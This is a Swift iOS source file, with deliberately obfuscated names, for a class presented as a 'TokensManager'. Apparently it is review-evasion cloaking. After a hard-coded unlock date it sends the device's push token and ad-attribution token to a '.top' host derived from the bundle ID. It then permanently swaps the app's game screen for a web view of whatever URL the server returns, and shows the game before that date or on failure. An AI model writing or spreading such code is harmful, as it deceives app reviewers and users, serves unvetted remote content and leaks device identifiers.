import SwiftUI
import AdServices
import UserNotifications
import Network

struct Xc7vT9q2: Decodable {
    let pL3mN8sK: String
    let rT5wY9hD: String
    
    init(from decoder: Decoder) throws {
        let container = try decoder.container(keyedBy: FgH8jK3l.self)
        self.pL3mN8sK = try container.decode(String.self, forKey: FgH8jK3l(stringValue: Qw2eR4tY.sEr5tY7u)!)
        self.rT5wY9hD = try container.decode(String.self, forKey: FgH8jK3l(stringValue: Qw2eR4tY.uJ8iK9o0)!)
    }
}

enum VbN6mK9l: Error {
    case mIsSiNgPaRaMs
    case mAlFoRmEdUrL
    case nO_DaTa_ReCvD
    case cOnN_TiMeOuT
}

struct FgH8jK3l: CodingKey {
    var stringValue: String
    init?(stringValue: String) {
        self.stringValue = stringValue
    }
    
    var intValue: Int? { nil }
    init?(intValue: Int) { return nil }
}

final class Qw2eR4tY {
    static var sEr5tY7u = ""
    static var uJ8iK9o0 = ""
    static var jhfdhbfb441 = ""
}

@MainActor
public class TokensManager {

    @ObservedObject var nEtMoNiToR = NeTwOrK_MnGr.shared
    private var aPiSeRvIcE: ApI_PrOtOcOl {
        return ApI_ImPlEmT()
    }
    
    private let sToReD_kEy = "xY7zP9qW"
    private var pUsH_tOkEn: String?
    private var aTt_TkEn: String?
    private var rTrY_cNt = 0
    private let mAx_rTrY = 10
    private let rTrY_iNtVl = 3.0
    
    public init(one: String, two: String, date: String) {
        Qw2eR4tY.sEr5tY7u = one
        Qw2eR4tY.uJ8iK9o0 = two
        Qw2eR4tY.jhfdhbfb441 = date
    }
    
    public func initializeConnection() async {
        
        guard cHk_UnLckDt(Qw2eR4tY.jhfdhbfb441) else {
            hNdL_FaIl()
            return
        }
        
        if !nEtMoNiToR.isConnected {
            await rTrY_cOnNeCt()
            return
        }
        
        if !fIrSt_LaUnCh() {
            pRoCeSs_StAtE()
            return
        }
        
        await gEt_TkNs()
        
        aPiSeRvIcE.eXeC_RqSt(deviceInfo: gEt_DvInFo()) { result in
            switch result {
            case .success(let url):
                self.hNdL_SuCcSs(destination: url)
                self.rQsT_NtF_Prm()
            case .failure:
                self.hNdL_FaIl()
            }
        }
    }
    
    private func rTrY_cOnNeCt() async {
        if rTrY_cNt >= mAx_rTrY {
            nTfY_fAiL()
            rTrY_cNt = 0
            return
        }
        
        rTrY_cNt += 1
        
        try? await Task.sleep(nanoseconds: UInt64(rTrY_iNtVl * 1_000_000_000))
        
        if nEtMoNiToR.isConnected {
            rTrY_cNt = 0
            
            if !fIrSt_LaUnCh() {
                pRoCeSs_StAtE()
            } else {
                await gEt_TkNs()
                
                aPiSeRvIcE.eXeC_RqSt(deviceInfo: gEt_DvInFo()) { result in
                    switch result {
                    case .success(let url):
                        self.hNdL_SuCcSs(destination: url)
                        self.rQsT_NtF_Prm()
                    case .failure:
                        self.hNdL_FaIl()
                    }
                }
            }
        } else {
            await rTrY_cOnNeCt()
        }
    }
    
    private func gEt_TkNs() async {
        await withCheckedContinuation { continuation in
            DispatchQueue.main.async {
                UIApplication.shared.registerForRemoteNotifications()
            }
            
            let timeLimit = DispatchTime.now() + 10
            
            NotificationCenter.default.addObserver(forName: .apnsTokenReceived, object: nil, queue: .main) { [weak self] notification in
                guard let self = self else { return }
                
                if let token = notification.userInfo?["token"] as? String {
                    Task { @MainActor in
                        self.pUsH_tOkEn = token
                        continuation.resume()
                    }
                }
            }
            
            DispatchQueue.main.asyncAfter(deadline: timeLimit) { [weak self] in
                guard let self = self else { return }
                if self.pUsH_tOkEn == nil {
                    Task { @MainActor in
                        self.pUsH_tOkEn = ""
                        continuation.resume()
                    }
                }
            }
        }

        do {
            self.aTt_TkEn = try AAAttribution.attributionToken()
        } catch {
            self.aTt_TkEn = ""
        }
    }

    func gEt_DvInFo() -> [String: String] {
        let data = [
            "apns_tk": pUsH_tOkEn ?? "",
            "att_tk": aTt_TkEn ?? ""
        ]
        return data
    }
    
    private func fIrSt_LaUnCh() -> Bool {
        !UserDefaults.standard.bool(forKey: "hS_LnChD_Bfr")
    }
    
    private func hNdL_SuCcSs(destination: URL) {
        UserDefaults.standard.set(destination.absoluteString, forKey: sToReD_kEy)
        UserDefaults.standard.set(true, forKey: "sHw_WbVw")
        UserDefaults.standard.set(false, forKey: "sHw_Gm")
        UserDefaults.standard.set(true, forKey: "hS_LnChD_Bfr")
        nTfY_sUcC(object: destination)
    }
    
    private func hNdL_FaIl() {
        UserDefaults.standard.set(true, forKey: "sHw_Gm")
        UserDefaults.standard.set(false, forKey: "sHw_WbVw")
        UserDefaults.standard.set(true, forKey: "hS_LnChD_Bfr")
        nTfY_fAiL()
    }
    
    private func pRoCeSs_StAtE() {
        if sHw_WbVw(), let urlString = UserDefaults.standard.string(forKey: sToReD_kEy), let url = URL(string: urlString) {
            nTfY_sUcC(object: url)
        } else {
            nTfY_fAiL()
        }
    }
    
    func cHk_UnLckDt(_ date: String) -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "yyyy-MM-dd"
        let currentDate = Date()
        guard let unlockDate = dateFormatter.date(from: date), currentDate >= unlockDate else {
            return false
        }
        return true
    }
    
    func sHw_Gm() -> Bool {
        UserDefaults.standard.bool(forKey: "sHw_Gm")
    }
    
    func sHw_WbVw() -> Bool {
        UserDefaults.standard.bool(forKey: "sHw_WbVw")
    }
    
    func rQsT_NtF_Prm() {
        let authOptions: UNAuthorizationOptions = [.alert, .badge, .sound]
        UNUserNotificationCenter.current().requestAuthorization(options: authOptions) {_, _ in }
    }
}

class NeTwOrK_MnGr: ObservableObject {
    static var shared = NeTwOrK_MnGr()
    let mNiTr = NWPathMonitor()
    let qUeUe = DispatchQueue(label: "mNiTr_q")
    @Published var isConnected = false
    @Published var iS_ExPnSv = false
    @Published var iS_CnStRnD = false
    @Published var cOnN_Tp = NWInterface.InterfaceType.other
    
    init() {
        mNiTr.pathUpdateHandler = { path in
            DispatchQueue.main.async {
                self.isConnected = path.status == .satisfied
                self.iS_ExPnSv = path.isExpensive
                self.iS_CnStRnD = path.isConstrained
                
                let cOnN_TyPs: [NWInterface.InterfaceType] = [.cellular, .wifi, .wiredEthernet]
                self.cOnN_Tp = cOnN_TyPs.first(where: path.usesInterfaceType) ?? .other
            }
        }
        
        mNiTr.start(queue: qUeUe)
    }
}

extension TokensManager {
    func nTfY_fAiL() {
        DispatchQueue.main.async {
            NotificationCenter.default.post(name: .failed, object: nil)
        }
    }
    
    func nTfY_sUcC(object: URL) {
        DispatchQueue.main.async {
            NotificationCenter.default.post(name: .updated, object: object)
        }
    }
}

protocol ApI_PrOtOcOl: AnyObject {
    func eXeC_RqSt(deviceInfo: [String: String], _ completion: @escaping (Result<URL,Error>) -> Void )
}

final class ApI_ImPlEmT: ApI_PrOtOcOl {
    
    func gEt_BsUrL() -> String {
        guard let bundleId = Bundle.main.bundleIdentifier else { return "" }
        let cleanedString = bundleId.replacingOccurrences(of: ".", with: "")
        let stringUrl: String = "https://" + cleanedString + ".top/indexn.php"
        return stringUrl.lowercased()
    }
    
    private func eNcD_ToAsCii(_ url: String) -> String {
        var result = ""
        for char in url {
            let scalar = char.unicodeScalars.first!
            result.append(String(format: "%%%02X", scalar.value))
        }
        return result
    }
    
    private func dEcD_FrAsCii(_ encoded: String) -> String? {
        var result = ""
        var i = encoded.startIndex
        
        while i < encoded.endIndex {
            if encoded[i] == "%" && i < encoded.index(encoded.endIndex, offsetBy: -2) {
                let start = encoded.index(i, offsetBy: 1)
                let end = encoded.index(i, offsetBy: 3)
                let hexString = String(encoded[start..<end])
                
                if let hexValue = UInt32(hexString, radix: 16),
                   let unicode = UnicodeScalar(hexValue) {
                    result.append(Character(unicode))
                    i = end
                } else {
                    return nil
                }
            } else {
                result.append(encoded[i])
                i = encoded.index(after: i)
            }
        }
        
        return result
    }
    
    private func gEt_FnLUrL(data: [String: String]) -> (encodedUrl: String, originalUrl: String)? {
        let queryItems = data.map { URLQueryItem(name: $0.key, value: $0.value) }
        var components = URLComponents()
        components.queryItems = queryItems
        
        guard let queryString = components.query?.data(using: .utf8) else {
            return nil
        }
        let base64String = queryString.base64EncodedString()
        
        let baseUrl = gEt_BsUrL()
        let fullUrlString = baseUrl + "?data=" + base64String
        
        let asciiEncodedUrl = eNcD_ToAsCii(fullUrlString)
        
        return (asciiEncodedUrl, fullUrlString)
    }
    
    func dEcD_JsDt(data: Data, completion: @escaping (Result<(encodedUrl: String, originalUrl: String), Error>) -> Void) {
        do {
            let decodedData = try JSONDecoder().decode(Xc7vT9q2.self, from: data)
            
            guard !decodedData.pL3mN8sK.isEmpty, !decodedData.rT5wY9hD.isEmpty else {
                completion(.failure(VbN6mK9l.mIsSiNgPaRaMs))
                return
            }
            
            let fullUrlString = "https://" + decodedData.pL3mN8sK + decodedData.rT5wY9hD
            
            let asciiEncodedUrl = eNcD_ToAsCii(fullUrlString)
            
            completion(.success((asciiEncodedUrl, fullUrlString)))
        } catch {
            UserDefaults.standard.setValue(true, forKey: "oN_BoRdNg")
            completion(.failure(error))
        }
    }
    
    func eXeC_RqSt(deviceInfo: [String: String], _ completion: @escaping (Result<URL, Error>) -> Void ) {
        guard let urlTuple = gEt_FnLUrL(data: deviceInfo) else {
            completion(.failure(VbN6mK9l.mAlFoRmEdUrL))
            return
        }
        
        let encodedUrl = urlTuple.encodedUrl
        
        guard let decodedUrl = dEcD_FrAsCii(encodedUrl) else {
            completion(.failure(VbN6mK9l.mAlFoRmEdUrL))
            return
        }
        
        guard let actualUrl = URL(string: decodedUrl) else {
            completion(.failure(VbN6mK9l.mAlFoRmEdUrL))
            return
        }
        
        let configuration = URLSessionConfiguration.default
        configuration.timeoutIntervalForRequest = 5
        let session = URLSession(configuration: configuration)
        
        let task = session.dataTask(with: actualUrl) { data, response, error in
            if let error = error as NSError?,
               error.code == NSURLErrorTimedOut {
                completion(.failure(VbN6mK9l.cOnN_TiMeOuT))
                return
            }
            
            if let data = data {
                self.dEcD_JsDt(data: data) { result in
                    switch result {
                        case .success(let urlTuple):
                            if let finalUrl = URL(string: urlTuple.originalUrl) {
                                completion(.success(finalUrl))
                            } else {
                                completion(.failure(VbN6mK9l.mAlFoRmEdUrL))
                            }
                        case .failure(let error):
                            completion(.failure(error))
                    }
                }
            } else {
                completion(.failure(VbN6mK9l.nO_DaTa_ReCvD))
            }
        }
        
        task.resume()
    }
}

public extension Notification.Name {
    static let updated = Notification.Name("updated")
    static let failed = Notification.Name("failed")
    static let apnsTokenReceived = Notification.Name("apnsTokenReceived")
}
